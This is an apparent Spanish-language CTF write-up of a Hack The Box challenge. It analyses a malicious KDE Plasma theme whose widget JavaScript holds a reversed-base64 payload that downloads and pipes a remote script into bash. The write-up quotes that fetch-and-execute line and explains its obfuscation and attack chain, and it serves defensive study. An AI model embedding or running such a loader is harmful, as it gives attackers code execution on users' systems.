---
title: "Sp00ky Theme"
description: "Writeup de Sp00ky Theme - Hack The Box - Misc 100pts. Tema de KDE Plasma con un plasmoid de red malicioso; utils.js contiene una constante PLASMOID_UPDATE_SOURCE con payload ofuscado (base64 invertido) que descarga y ejecuta un script remoto; la cadena decodificada es la flag."
sidebar:
  badge:
    text: Misc
    variant: note
tags:
  - htb
  - misc
  - kde
  - plasma
  - plasmoid
  - javascript
  - obfuscation
  - base64
  - reverse
  - static-analysis
---

# Sp00ky Theme

> 🎯 Plataforma: Hack The Box
> 📂 Categoría: Misc
> 🏆 Puntos: 100
> 👤 Autor: warrior866

---

## Descripción

Se nos proporciona un archivo de tema global para **KDE Plasma** que supuestamente tiene efectos extraños. El reto ilustra cómo un tema de escritorio puede ser un vector de malware: los plasmoids (widgets de Plasma) contienen JavaScript que se ejecuta en el entorno del usuario, y un actor malicioso puede ocultar código malicioso dentro de un tema aparentemente inocente.

La flag está ofuscada como una URL en una constante JavaScript dentro del código del widget, codificada como base64 invertido.

---

## Reconocimiento del contenido

El archivo del tema contiene tres directorios principales:

```bash
ls -R
# desktoptheme/    → tema visual (SVG, colores, plasmarc)
# look-and-feel/   → layouts, previews, defaults
# plasmoids/       → widgets ejecutables
```

Los directorios `desktoptheme/` y `look-and-feel/` contienen principalmente archivos SVG y de configuración visual, inofensivos. El directorio sospechoso es `plasmoids/`, que contiene **código JavaScript ejecutable**:

```bash
ls plasmoids/
# org.kde.netspeedWidget/

ls plasmoids/org.kde.netspeedWidget/contents/code/
# utils.js
```

El plasmoid `netspeedWidget` muestra la velocidad de red — un widget legítimo que existe en el KDE Store. Esta versión modificada incluye código malicioso en `utils.js`.

---

## Análisis de utils.js

```bash
sed -n '4,6p' plasmoids/org.kde.netspeedWidget/contents/code/utils.js
```

```javascript
const PLASMOID_UPDATE_SOURCE =
    "UPDATE_URL=$(echo 952MwBHNo9lb0M2X0FzX/Eycz02MoR3X5J2XkNjb3B3eCRFS | rev | base64 -d); curl $UPDATE_URL:1992/update_sh | bash"
```

Esta constante contiene un payload de shell que:
1. Toma la cadena `952MwBHNo9lb0M2X0FzX/Eycz02MoR3X5J2XkNjb3B3eCRFS`.
2. La invierte con `rev`.
3. La decodifica desde base64.
4. Usa la URL resultante para descargar y ejecutar un script con `curl ... | bash`.

El patrón `curl URL | bash` es una técnica de ejecución remota de código común en malware de scripts — descarga y ejecuta código arbitrario del servidor del atacante.

---

## Decodificación de la cadena ofuscada

La cadena está codificada en **base64 invertido** (primero se invierte, luego se decodifica):

```bash
echo "952MwBHNo9lb0M2X0FzX/Eycz02MoR3X5J2XkNjb3B3eCRFS" | rev | base64 -d
```

```text
HTB{FLAG}
```

El resultado es directamente la flag.

---

## ¿Por qué esta técnica de ofuscación?

- **`rev`** invierte el string carácter a carácter. Un string base64 válido puede pasar desapercibido, pero invertido no parece base64 a primera vista.
- **`base64 -d`** decodifica el resultado de la inversión.
- La URL resultante apuntaría al servidor C2 del atacante en el puerto 1992. Si el widget se ejecutara, descargaría y ejecutaría un script malicioso sin que el usuario lo note.
- Esta técnica de obfuscación es simple pero efectiva para evadir inspección superficial.

---

## Cadena de Ataque (perspectiva del atacante)

```text
1. Usuario descarga e instala el tema global de KDE Plasma
       ↓
2. Plasma carga el plasmoid org.kde.netspeedWidget
       ↓
3. utils.js se ejecuta → PLASMOID_UPDATE_SOURCE se evalúa
       ↓
4. Shell decodifica la URL: rev + base64 -d → C2 server URL
       ↓
5. curl $C2:1992/update_sh | bash → ejecución de código remoto del atacante
       ↓
6. Backdoor/malware instalado en el sistema del usuario
```

---

## Solución resumida

```bash
# Solo necesitamos analizar estáticamente el archivo JavaScript
cat plasmoids/org.kde.netspeedWidget/contents/code/utils.js

# Decodificar el payload ofuscado
echo "952MwBHNo9lb0M2X0FzX/Eycz02MoR3X5J2XkNjb3B3eCRFS" | rev | base64 -d
# HTB{FLAG}
```

---

## Lecciones Aprendidas

- **Los temas de escritorio son código ejecutable**: en KDE Plasma, los plasmoids son JavaScript que corre con los permisos del usuario. Instalar temas de fuentes no verificadas es tan peligroso como ejecutar un binario desconocido.
- **Revisar siempre los archivos `.js` en temas/plugins**: la superficie de ataque de un tema de escritorio incluye cualquier archivo de código, no solo los ejecutables binarios.
- **Ofuscación simple pero efectiva**: invertir una cadena base64 es suficiente para evadir una inspección rápida. Las herramientas de análisis estático de código malicioso en scripts deberían detectar patrones como `rev | base64 -d` o `curl ... | bash`.
- **`curl URL | bash` como indicador de malware**: este patrón debe considerarse siempre sospechoso, independientemente del contexto.

---

## Referencias

- [KDE Plasma — Plasmoids](https://develop.kde.org/docs/plasma/widget/)
- [HackTricks — Persistence via desktop files/themes](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#persistence)
- [GTFOBins / Living off the Land Binaries](https://gtfobins.github.io/)
